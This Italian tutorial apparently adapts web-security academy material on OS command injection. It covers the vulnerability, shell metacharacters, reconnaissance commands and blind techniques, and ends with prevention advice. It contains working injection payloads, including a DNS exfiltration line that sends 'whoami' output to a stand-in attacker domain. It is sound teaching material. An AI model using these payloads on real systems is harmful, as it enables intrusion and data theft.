L'iniezione di comandi del sistema operativo (Command Injection), anche nota come iniezione di shell, consente a un aggressore di eseguire comandi del sistema operativo (SO) sul server che esegue un'applicazione e, in genere, di compromettere completamente l'applicazione e i suoi dati. Spesso, un aggressore può sfruttare una vulnerabilità di iniezione di comandi del sistema operativo per compromettere altre parti dell'infrastruttura di hosting e sfruttare le relazioni di fiducia per indirizzare l'attacco ad altri sistemi all'interno dell'organizzazione.
## OS Command Injection
Consideriamo un'applicazione di shopping consente all'utente di visualizzare se un articolo è disponibile in magazzino in un particolare negozio. Questa informazione è accessibile tramite un URL:

https://insecure-website.com/stockStatus?productID=381&storeID=29

Per fornire le informazioni sulle azioni, l'applicazione deve interrogare vari sistemi legacy. Per ragioni storiche, la funzionalità viene implementata chiamando un comando shell con gli ID prodotto e store come argomenti:

`stockreport.pl 381 29`

Questo comando restituisce all'utente lo stato delle scorte dell'articolo specificato. L'applicazione non implementa alcuna difesa contro l'iniezione di comandi del sistema operativo; quindi, un aggressore può inviare il seguente input per eseguire un comando arbitrario:

`& echo aiwefwlguh &`

Se questo input viene inviato nel parametro productID, il comando eseguito dall'applicazione è:

`stockreport.pl & echo aiwefwlguh & 29`

Il comando echo fa sì che la stringa fornita venga riprodotta nell'output. Questo è un modo utile per testare alcuni tipi di iniezione di comandi del sistema operativo. Il carattere & è un separatore di comandi shell. In questo esempio, fa sì che tre comandi separati vengano eseguiti, uno dopo l'altro.

L'output restituito all'utente è:

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

Le tre linee di output dimostrano che:
- il comando stockreport.pl originale è stato eseguito senza gli argomenti previsti e pertanto ha restituito un messaggio di errore;
- il comando echo inserito è stato eseguito e la stringa fornita è stata riprodotta nell'output;
- l'argomento originale 29 è stato eseguito come comando, il che ha causato un errore.

Posizionare il separatore di comando aggiuntivo & dopo il comando iniettato è utile perché separa il comando iniettato da qualsiasi cosa segua il punto di iniezione. Ciò riceve la possibilità che ciò che segue impedisca l'esecuzione del comando iniettato (APPRENTICE: OS command injection, simple case).
### Comandi utili
Dopo aver identificato una vulnerabilità di iniezione di comandi del sistema operativo, è utile eseguire alcuni comandi iniziali per ottenere informazioni sul sistema. Di seguito è riportato un riepilogo di alcuni comandi utili sulle piattaforme Linux e Windows:

| Purpose of command | Linux | Windows |
| :--- | :--- | :--- |
| Name of current user | `whoami` | `whoami` |
| Operating system | `uname -a` | `ver` |
| Network configuration | `ifconfig` | `ipconfig /all` |
| Network connections | `netstat -an` | `netstat -an` |
| Running processes | `ps -ef` | `tasklist` |
### Modi per iniettare
È possibile utilizzare un certo numero di metacaratteri shell per eseguire attacchi di iniezione di comandi del sistema operativo.

Un certo numero di caratteri funziona come separatori di comandi, consentendo di concatenare i comandi. I seguenti separatori di comandi funzionano sia su sistemi basati su Windows che su Unix:
• `&`
• `&&`
• `|`
• `||

I seguenti separatori di comando funzionano solo sui sistemi basati su Unix:
-  `;`
- newline (0x0a oppure \n)

Nei sistemi basati su Unix, è anche possibile utilizzare i backtick o il carattere dollaro per eseguire l'esecuzione in linea di un comando iniettato all'interno del comando originale:
- `` `comando iniettato` ``
- `$(comando iniettato)`

I diversi metacaratteri della shell hanno comportamenti leggermente diversi che potrebbero cambiare se funzionano o meno in determinate situazioni. Ciò potrebbe avere un impatto sul fatto che consentano il recupero in-band dell'output del comando o siano utili solo per lo sfruttamento blind.

A volte, l'input che controlli appare tra virgolette nel comando originale. In questa situazione, devi terminare il contesto tra virgolette (utilizzando " o ') prima di utilizzare metacaratteri della shell adatti per iniettare un nuovo comando.
## Blind OS Command Injection
Molte istanze di iniezione di comandi del sistema operativo sono vulnerabilità blind. Ciò significa che l'applicazione non restituisce l'output del comando all'interno della sua risposta HTTP. Le vulnerabilità blind possono ancora essere sfruttate, ma sono necessarie tecniche diverse.

Ad esempio, immagina un sito web che consente agli utenti di inviare feedback sul sito. L'utente inserisce il proprio indirizzo e-mail e il messaggio di feedback. L'applicazione lato server genera quindi un'e-mail a un amministratore del sito contenente il feedback. Per farlo, chiama il programma mail con i dettagli inviati:

`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`

L'output del comando mail (se presente) non viene restituito nelle risposte dell’applicazione; quindi, usare il payload echo non funzionerà. In questa situazione, puoi usare una varietà di altre tecniche per rilevare e sfruttare una vulnerabilità.
### Rilevazione tramite ritardi temporali
Puoi usare un comando iniettato per innescare un ritardo temporale, consentendoti di confermare che il comando è stato eseguito in base al tempo impiegato dall'applicazione per rispondere. Il comando ping è un buon modo per farlo, perché ti consente di specificare il numero di pacchetti ICMP da inviare. Ciò ti consente di controllare il tempo impiegato per l'esecuzione del comando:

`& ping -c 10 127.0.0.1 &`

Questo comando fa sì che l'applicazione esegua il ping sulla sua scheda di rete loopback per 10 secondi (PRACTITIONER: Blind OS command injection with time delays).
### Sfruttamento tramite reindirizzamento dell’output
Puoi reindirizzare l'output del comando iniettato in un file all'interno della radice web che puoi quindi recuperare tramite il browser. Ad esempio, se l'applicazione serve risorse statiche dalla posizione del file system /var/www/static, puoi inviare il seguente input:

`& whoami > /var/www/static/whoami.txt &`

Il carattere > invia l'output dal comando whoami al file specificato. Puoi quindi usare il browser per andare a https://vulnerable-website.com/whoami.txt per recuperare il file e visualizzare l'output dal comando iniettato (PRACTITIONER: Blind OS command injection with output redirection).
### Sfruttamento tramite tecniche out-of-band (OAST)
Puoi usare un comando iniettato che innescherà un'interazione di rete out-of-band con un sistema che controlli, usando tecniche OAST. Ad esempio:

`& nslookup kgji2ohoyw.web-attacker.com &`

Questo payload usa il comando nslookup per causare una ricerca DNS per il dominio specificato. L'attaccante può monitorare per vedere se la ricerca avviene, per confermare se il comando è stato iniettato correttamente (PRACTITIONER: Blind OS command injection with out-of-band interaction).

Il canale out-of-band fornisce un modo semplice per esfiltrare l'output dai comandi iniettati:

`& nslookup `whoami`.kgji2ohoyw.web-attacker.com &`

Ciò provoca una ricerca DNS sul dominio dell'attaccante contenente il risultato del comando whoami (PRACTITIONER: Blind OS command injection with out-of-band data exfiltration):

`wwwuser.kgji2ohoyw.web-attacker.com`
## Come prevenire gli attacchi di OS Command Injection
Il modo più efficace per prevenire le vulnerabilità di OS command injection è non chiamare mai i comandi del sistema operativo dal codice del livello applicazione. In quasi tutti i casi, ci sono diversi modi per implementare la funzionalità richiesta utilizzando API di piattaforma più sicure.

Se devi chiamare i comandi del sistema operativo con input fornito dall'utente, allora devi eseguire una convalida di input forte. Ecco alcuni esempi di convalida efficace:
- convalida rispetto a una whitelist di valori consentiti;
- convalida che l’input sia un numero;
- convalida che l'input contenga solo caratteri alfanumerici, nessun'altra sintassi o spazi vuoti.

Non tentare mai di sanificare l'input eseguendo l'escape dei metacaratteri della shell. In pratica, questo è troppo soggetto a errori e vulnerabile a essere aggirato da un aggressore esperto.
